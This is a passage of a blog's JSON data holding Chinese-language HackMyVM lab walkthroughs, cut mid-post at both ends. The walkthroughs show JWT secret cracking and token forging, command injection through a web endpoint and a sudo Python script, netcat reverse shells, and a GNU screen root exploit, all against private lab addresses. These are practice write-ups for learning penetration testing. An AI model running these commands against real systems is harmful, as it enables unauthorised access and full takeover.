2.11.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://192.168.205.138:3000\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.11.0\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83d\udcb2  Extensions            \u2502 [php, html, txt, md]\n \ud83c\udfc1  HTTP methods          \u2502 [POST]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n404     POST       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   \n401     POST        1l        2w       22c http://192.168.205.138:3000/login\n400     POST        1l        6w       29c http://192.168.205.138:3000/register\n401     POST        1l        2w       22c http://192.168.205.138:3000/Login\n400     POST        1l        6w       29c http://192.168.205.138:3000/Register\n401     POST        1l        1w       12c http://192.168.205.138:3000/execute\n\n```\n\n\u4f7f\u7528`curl`\u8bbf\u95ee\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/login -X POST\nIdentifiants invalides                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/register -X POST\nThe 'role' field is not valid                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/execute -X POST \nUnauthorized                                                                                                                                    \n\n```\n\n\u6211\u4eec\u6ce8\u518c\u4e00\u4e2a\u7528\u6237\u8bd5\u8bd5\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\\'role\\':\\'admin\\'}'\nNot authorized !\n```\n\n\u554a\u8fd9\uff0c\u4e22\u53bb`WFUZZ`\u7206\u7834\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wfuzz -c -u 'http://192.168.205.138:3000/register' -X POST -H 'Content-Type: application/json' -d '{\\'role\\':\\'FUZZ\\'}' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 6\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.205.138:3000/register\nTotal requests: 62284\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                             \n=====================================================================\n\n000000003:   401        0 L      3 W        16 Ch       'admin'                                                             \n000000022:   500        0 L      5 W        32 Ch       'user'                                                              \n\nTotal time: 58.91045\nProcessed Requests: 62284\nFiltered Requests: 62282\nRequests/sec.: 1057.265\n\n```\n\n\u7ee7\u7eed\u6ce8\u518c\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\\'role\\':\\'user\\'}' \nColumn 'username' cannot be null                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\\'role\\':\\'user\\',\\'username\\':\\'xxoo\\'}'\nColumn 'password' cannot be null                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\\'role\\':\\'user\\',\\'username\\':\\'xxoo\\',\\'password\\':\\'xxoo\\'}'\nRegistration OK                                                                                                                                     \n```\n\n\u53bb\u767b\u5f55\u8bd5\u8bd5\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/login -X POST -H 'Content-Type: application/json' -d '{\\'role\\':\\'user\\',\\'username\\':\\'xxoo\\',\\'password\\':\\'xxoo\\'}'\n{'accessToken':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA'}\n```\n\n\u8fd9\u5f88`jwt`\uff0c\u53bb\u5c1d\u8bd5\u89e3\u7801\uff0c[\u7f51\u7ad9](https://jwt.io/)\n\n![Image](https://github.com/user-attachments/assets/c55c1345-380f-4116-911b-b55fe1655ab6)\n\n\u5c06\u5bc6\u94a5\u7206\u7834\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA' > hash\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])\nWill run 12 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nnopassword       (?)   \n1g 0:00:00:00 DONE (2025-01-23 10:31) 100.0g/s 4915Kp/s 4915Kc/s 4915KC/s 123456..trudy\nUse the '--show' option to display all of the cracked passwords reliably\nSession completed.\n```\n\n\u6539\u4e00\u4e0b\u53c2\u6570\n\n![Image](https://github.com/user-attachments/assets/8c4fe2dd-1e58-4776-b407-e717b8dd3ef6)\n\n\u5c1d\u8bd5\u4e00\u4e0b\u90a3\u4e2a`execute`\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk'\n<!DOCTYPE html>\n<html lang='en'>\n<head>\n<meta charset='utf-8'>\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError [ERR_INVALID_ARG_TYPE]: The &quot;file&quot; argument must be of type string. Received undefined<br> &nbsp; &nbsp;at validateString (internal/validators.js:120:11)<br> &nbsp; &nbsp;at normalizeSpawnArguments (child_process.js:411:3)<br> &nbsp; &nbsp;at spawn (child_process.js:547:16)<br> &nbsp; &nbsp;at Object.execFile (child_process.js:237:17)<br> &nbsp; &nbsp;at exec (child_process.js:158:25)<br> &nbsp; &nbsp;at /opt/login-app/app.js:69:3<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/opt/login-app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/opt/login-app/node_modules/express/lib/router/route.js:144:13)<br> &nbsp; &nbsp;at /opt/login-app/app.js:112:5<br> &nbsp; &nbsp;at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:12</pre>\n</body>\n</html>\n\n```\n\n`Authorization` \u5934\u4ee5 `Bearer` \u5f00\u5934\u3002\u62a5\u9519\u4e86\uff0c\u63d0\u793a '`file` \u53c2\u6570\u5e94\u8be5\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u63a5\u6536\u5230\u4e86 `undefined`'\u3002\u6839\u636e\u5b83\u7684\u540d\u5b57\u548c\u62a5\u9519\u6211\u4eec\u53ef\u4ee5\u731c\u51fa\u8be5\u7f51\u9875\u5e94\u8be5\u662f\u7528\u6765\u6267\u884c\u547d\u4ee4\u7684\uff0c\u6211\u4eec`wfuzz`\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wfuzz -c -u 'http://192.168.205.138:3000/execute' -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk' -d '{\\'FUZZ\\':\\'id\\'}' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 63\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.205.138:3000/execute\nTotal requests: 62284\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                             \n=====================================================================\n\n000008958:   200        1 L      3 W        54 Ch       'command'                                                           \n^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...\n\nTotal time: 19.47640\nProcessed Requests: 13025\nFiltered Requests: 13024\nRequests/sec.: 668.7578\n\n```\n\n\u5c1d\u8bd5\u6267\u884c\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk' -d '{'command':'id'}'  \nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u5f39\u4e2ashell\u56de\u6765\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk' -d '{'command':'nc 192.168.205.141 8888 -e /bin/bash'}' \n```\n\n\u5361\u4f4f\u4e86\uff0c\u5361\u4f4f\u5c31\u5bf9\u4e86\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888          \nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 43824\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n```\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6**\u53cd\u5411 shell** \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```bash\nwww-data@aurora:~$ ls -la\ntotal 124\ndrwxr-xr-x   3 www-data www-data  4096 Apr  6  2023 .\ndrwxr-xr-x   3 root     root      4096 Mar  1  2023 ..\n-rw-r--r--   1 www-data www-data  3271 Mar  1  2023 app.js\n-rw-r--r--   1 www-data www-data  3169 Mar  2  2023 app.js.save\n-rw-------   1 www-data www-data   153 Apr  6  2023 .bash_history\ndrwxr-xr-x 127 www-data www-data  4096 Mar  1  2023 node_modules\n-rw-r--r--   1 www-data www-data   399 Mar  1  2023 package.json\n-rw-r--r--   1 www-data www-data 95944 Mar  1  2023 package-lock.json\nwww-data@aurora:~$ cat .bash_history\nclear\ncd /home/doro/\nclear\nsudo -l\n/usr/bin/python3 /home/doro/tools.py --ping\nsudo -u doro /usr/bin/python3 /home/doro/tools.py --ping\nclear\ncrontab -l\nwww-data@aurora:~$ sudo -l\nMatching Defaults entries for www-data on aurora:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on aurora:\n    (doro) NOPASSWD: /usr/bin/python3 /home/doro/tools.py *\nwww-data@aurora:~$ cat /home/doro/tools.py\nimport os\nimport sys\n\ndef main():\n    if len(sys.argv) < 2:\n        print_help()\n        return\n  \n    option = sys.argv[1]\n    if option == '--ping':\n        ping()\n    elif option == '--traceroute':\n        traceroute_ip()\n    else:\n        print('Invalid option.')\n        print_help()\n\ndef print_help():\n    print('Usage: python3 network_tool.py <option>')\n    print('Options:')\n    print('--ping           Ping an IP address')\n    print('--traceroute     Perform a traceroute on an IP address')\n\ndef ping():\n    ip_address = input('Enter an IP address: ')\n\n    forbidden_chars = ['&', ';', '(', ')', '||', '|', '>', '<', '*', '?']\n    for char in forbidden_chars:\n        if char in ip_address:\n            print('Forbidden character found: {}'.format(char))\n            sys.exit(1)\n  \n    os.system('ping -c 2 ' + ip_address)\n\ndef traceroute_ip():\n    ip_address = input('Enter an IP address: ')\n\n    if not is_valid_ip(ip_address):\n        print('Invalid IP address.')\n        return\n  \n    traceroute_command = 'traceroute {}'.format(ip_address)\n    os.system(traceroute_command)\n\ndef is_valid_ip(ip_address):\n    octets = ip_address.split('.')\n    if len(octets) != 4:\n        return False\n    for octet in octets:\n        if not octet.isdigit() or int(octet) < 0 or int(octet) > 255:\n            return False\n    return True\n\nif __name__ == '__main__':\n    main()\nwww-data@aurora:~$ ls -la /home/doro/\ntotal 36\ndrwxr-xr-x 4 doro doro 4096 Mar  8  2023 .\ndrwxr-xr-x 3 root root 4096 Mar  6  2023 ..\nlrwxrwxrwx 1 root root    9 Mar  3  2023 .bash_history -> /dev/null\n-rw-r--r-- 1 doro doro  220 Mar  3  2023 .bash_logout\n-rw-r--r-- 1 doro doro 3526 Mar  3  2023 .bashrc\ndrwxr-xr-x 3 doro doro 4096 Mar  4  2023 .local\n-rw-r--r-- 1 doro doro  807 Mar  3  2023 .profile\ndrwx------ 2 doro doro 4096 Mar  4  2023 .ssh\n-rw-r--r-- 1 root root 1380 Mar  7  2023 tools.py\n-rwx------ 1 doro doro   33 Mar  3  2023 user.txt\n\n```\n\n\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e0b\u4ee3\u7801\u6ce8\u5165\uff0c\u9700\u8981\u6ce8\u610f\u4ed6\u7981\u7528\u4e86`&`, `;`, `(`, `)`, `||`, `|`, `>`, `<`, `*`, `?`\n\n```bash\nwww-data@aurora:/tmp$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping\nEnter an IP address: `id`\nping: groups=1000(doro): Name or service not known\n```\n\n\u6267\u884c\u6210\u529f\uff0c\u5c1d\u8bd5\u5f39shell\n\n```bash\nwww-data@aurora:/tmp$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping\nEnter an IP address: `nc 192.168.205.141 8888 -e /bin/bash` \n```\n\n\u6210\u529f\u5f39\u4e86\u56de\u6765\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 57096\nid\nuid=1000(doro) gid=1000(doro) groups=1000(doro)\n\n```\n\n\u89e6\u53d1\u4e00\u4e0b\u7a33\u5b9a Shell\u5c0f\u8fde\u62db\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n\u7ee7\u7eed\u63d0\u6743\n\n```bash\ndoro@aurora:~$ id\nuid=1000(doro) gid=1000(doro) groups=1000(doro)\ndoro@aurora:~$ sudo -l\n[sudo] password for doro: \nsudo: a password is required\ndoro@aurora:~$ cd /home/doro/\ndoro@aurora:~$ ls -al\ntotal 36\ndrwxr-xr-x 4 doro doro 4096 Mar  8  2023 .\ndrwxr-xr-x 3 root root 4096 Mar  6  2023 ..\nlrwxrwxrwx 1 root root    9 Mar  3  2023 .bash_history -> /dev/null\n-rw-r--r-- 1 doro doro  220 Mar  3  2023 .bash_logout\n-rw-r--r-- 1 doro doro 3526 Mar  3  2023 .bashrc\ndrwxr-xr-x 3 doro doro 4096 Mar  4  2023 .local\n-rw-r--r-- 1 doro doro  807 Mar  3  2023 .profile\ndrwx------ 2 doro doro 4096 Mar  4  2023 .ssh\n-rw-r--r-- 1 root root 1380 Mar  7  2023 tools.py\n-rwx------ 1 doro doro   33 Mar  3  2023 user.txt\ndoro@aurora:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/mount\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/screen\n/usr/bin/sudo\n/usr/bin/umount\n\n```\n\n`/usr/bin/screen`\u8fd9\u4e2a\u6ca1\u89c1\u8fc7\uff0c\u770b\u770b\u80fd\u4e0d\u80fd\u63d0\u6743\u3002\u627e\u5230\u4e00\u7bc7[\u6587\u7ae0](https://www.exploit-db.com/exploits/41154)\uff0c\u8fd8\u662f\u5229\u7528\u811a\u672c\uff0c\u66f4\u5f00\u5fc3\u4e86\n\n```bash\ndoro@aurora:/tmp$ vi screenroot.sh\ndoro@aurora:/tmp$ chmod +x screenroot.sh \ndoro@aurora:/tmp$ bash screenroot.sh \n~ gnu/screenroot ~\n[+] First, we create our shell and library...\n/tmp/libhax.c: In function \u2018dropshell\u2019:\n/tmp/libhax.c:7:5: warning: implicit declaration of function \u2018chmod\u2019 [-Wimplicit-function-declaration]\n    7 |     chmod('/tmp/rootshell', 04755);\n      |     ^~~~~\n/tmp/rootshell.c: In function \u2018main\u2019:\n/tmp/rootshell.c:3:5: warning: implicit declaration of function \u2018setuid\u2019 [-Wimplicit-function-declaration]\n    3 |     setuid(0);\n      |     ^~~~~~\n/tmp/rootshell.c:4:5: warning: implicit declaration of function \u2018setgid\u2019 [-Wimplicit-function-declaration]\n    4 |     setgid(0);\n      |     ^~~~~~\n/tmp/rootshell.c:5:5: warning: implicit declaration of function \u2018seteuid\u2019 [-Wimplicit-function-declaration]\n    5 |     seteuid(0);\n      |     ^~~~~~~\n/tmp/rootshell.c:6:5: warning: implicit declaration of function \u2018setegid\u2019 [-Wimplicit-function-declaration]\n    6 |     setegid(0);\n      |     ^~~~~~~\n/tmp/rootshell.c:7:5: warning: implicit declaration of function \u2018execvp\u2019 [-Wimplicit-function-declaration]\n    7 |     execvp('/bin/sh', NULL, NULL);\n      |     ^~~~~~\n/tmp/rootshell.c:7:5: warning: too many arguments to built-in function \u2018execvp\u2019 expecting 2 [-Wbuiltin-declaration-mismatch]\n[+] Now we create our /etc/ld.so.preload file...\n[+] Triggering...\n' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.\n[+] done!\nNo Sockets found in /tmp/screens/S-doro.\n\n# id\nuid=0(root) gid=0(root) groups=0(root),1000(doro)\n\n```\n\n\u6210\u529f\u63d0\u6743sentence", "top": 0, "createdAt": 1751016752, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P91": {"htmlDir": "docs/post/hmv_azer.html", "labels": ["HackMyVM"], "postTitle": "hmv_azer", "postUrl": "post/hmv_azer.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/91", "commentNum": 0, "wordCount": 2961, "description": "# hmv_azer\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - azer](https://hackmyvm.eu/machines/machine.php?vm=Azer)\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.235\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n---\n\n# 1.\u626b\u63cf\n\n\u4f7f\u7528 `Nmap` \u8fdb\u884c\u521d\u6b65\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u548c\u7aef\u53e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS -p- -Pn -n -T4 192.168.205.235\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 11:19 CST\nNmap scan report for 192.168.205.235\nHost is up (0.00038s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n80/tcp   open  http\n3000/tcp open  ppp\nMAC Address: 08:00:27:07:E9:02 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.77 seconds\n                                                           \n```\n\n\u7ed3\u679c\u663e\u793a\u4e24\u4e2a\u5f00\u653e\u7aef\u53e3\uff1a\n\n**80/tcp** - HTTP \u670d\u52a1\n**3000/tcp** - \u539f\u59cb\u663e\u793a\u4e3a PPP\uff0c\u4f46\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a web \u5e94\u7528\u7a0b\u5e8f\uff0c\u7528\u4e8e\u7528\u6237\u8ba4\u8bc1\n\n---\n\n# 2.\u8e29\u70b9\n\n`80`\u7aef\u53e3\u9875\u6ca1\u6709\u53d1\u73b0\u660e\u663e\u5229\u7528\u70b9\uff0c\u8e29\u70b9`3000`\u7aef\u53e3\n\n![image](https://github.com/user-attachments/assets/3b565e9c-e8cd-41ae-bf84-0cf6e7460d2e)\n\n![image](https://github.com/user-attachments/assets/f2dcad05-b377-43e6-aa7b-159b04935536)\n\n![image](https://github.com/user-attachments/assets/9ab7e04b-b4c3-4d36-9fdf-b4d1c827bf98)\n\n\u5728\u8fdb\u4e00\u6b65\u63a2\u7d22\u4e2d\u53d1\u73b0\uff0c**3000** \u7aef\u53e3\u7684\u5e94\u7528\u7a0b\u5e8f\u4f3c\u4e4e\u901a\u8fc7\u6267\u884c `.sh` \u811a\u672c\u6765\u8fdb\u884c\u5bc6\u7801\u9a8c\u8bc1\u3002\u5229\u7528\u8fd9\u4e00\u7279\u6027\uff0c\u6210\u529f\u7ed5\u8fc7\u4e86**\u5bc6\u7801\u9a8c\u8bc1**\uff0c\u5e76\u5efa\u7acb\u4e86**\u53cd\u5f39 Shell**\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.235] 46566\nbash: cannot set terminal process group (483): Inappropriate ioctl for device\nbash: no job control in this shell\nazer@azer:~$ id\nid\nuid=1000(azer) gid=1000(azer) groups=1000(azer),100(users)\n\n```\n\n---\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6**\u53cd\u5411 shell** \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n---\n\n# 4.\u63d0\u6743\n\n```bash\nazer@azer:~$ hostname -I\n192.168.205.235 10.10.10.1 172.17.0.1 \n\nazer@azer:~$ ./fscan -h 10.10.10.1/24 -no -np -nopoc\n\n   ___                              _  \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <  \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n10.10.10.1:80 open\n10.10.10.10:80 open\n\n```\n\n`-np` \u8df3\u8fc7\u5b58\u6d3b\u68c0\u6d4b\n`-no` \u4e0d\u4fdd\u5b58\u6587\u4ef6\n`-nopoc` \u8df3\u8fc7web poc\u626b\u63cf\n\n\u901a\u8fc7\u626b\u63cf\u5185\u90e8\u7f51\u7edc\u53d1\u73b0\u4e86\u53e6\u4e00\u4e2a IP `10.10.10.10` \u6b63\u5728\u8fd0\u884c **HTTP** \u670d\u52a1\u3002\n\n```bash\nazer@azer:~$ nc 10.10.10.10 80\nHello\nHTTP/1.1 400 Bad Request\nDate: Wed, 08 Jan 2025 05:03:33 GMT\nServer: Apache/2.4.58 (Unix)\nContent-Length: 226\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>\n<html><head>\n<title>400 Bad Request</title>\n</head><body>\n<h1>Bad Request</h1>\n<p>Your browser sent a request that this server could not understand.<br />\n</p>\n</body></html>\nazer@azer:~$ curl 10.10.10.10\n.:.AzerBulbul.:.\n```\n\n\u8bbf\u95ee\u8be5\u670d\u52a1\u65f6\uff0c\u5f97\u5230\u4e86\u4e00\u4e2a\u770b\u8d77\u6765\u50cf\u5bc6\u7801\u7684\u5b57\u7b26\u4e32\u3002\n\n```bash\nazer@azer:~$ su -\nPassword: \nroot@azer:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\n```\n\n\u6210\u529f\u63d0\u6743\u81f3 rootsentence", "top": 0, "createdAt": 1751016755, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P92": {"htmlDir": "docs/post/hmv_Blackhat2.html", "labels": ["HackMyVM"], "postTitle": "hmv_Blackhat2", "postUrl": "post/hmv_Blackhat2.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/92", "commentNum": 0, "wordCount": 7467, "description": "# hmv_Blackhat2\n\n**\u9776\u673a**\uff1a[HackMyVM - Blackhat2](https://hackmyvm.eu/machines/machine.php?vm=Blackhat2)\n**\u96be\u5ea6**\uff1a\u9ec4\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.218\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n## 1. \u7aef\u53e3\u679a\u4e3e\u53ca\u670d\u52a1\u63a2\u6d4b\n\n\u9996\u5148\uff0c\u4f7f\u7528 `nmap` \u626b\u63cf\u76ee\u6807 IP \u7684\u5f00\u653e\u7aef\u53e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sV -sT -O -Pn -n -p- 192.168.205.218\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 21:27 CST\nNmap scan report for 192.168.205.218\nHost is up (0.00034s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.57 ((Debian))\nMAC Address: 08:00:27:17:26:A8 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 